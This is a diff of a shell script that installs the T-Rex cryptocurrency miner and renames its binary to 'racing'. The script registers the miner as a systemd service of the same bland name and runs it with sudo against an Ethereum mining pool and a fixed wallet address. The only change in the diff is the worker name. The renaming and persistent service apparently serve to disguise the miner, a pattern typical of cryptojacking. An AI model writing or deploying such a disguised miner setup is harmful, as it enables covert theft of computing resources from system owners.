@@ -16,4 +16,4 @@ sudo tar xvzf t-rex-0.21.6-linux.tar.gz
 sudo mv t-rex racing
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
-sudo ./racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x35233a7cd7b76df3534f81353320bcc51b31a900 -p x -w foundercc11
+sudo ./racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0x35233a7cd7b76df3534f81353320bcc51b31a900 -p x -w rog
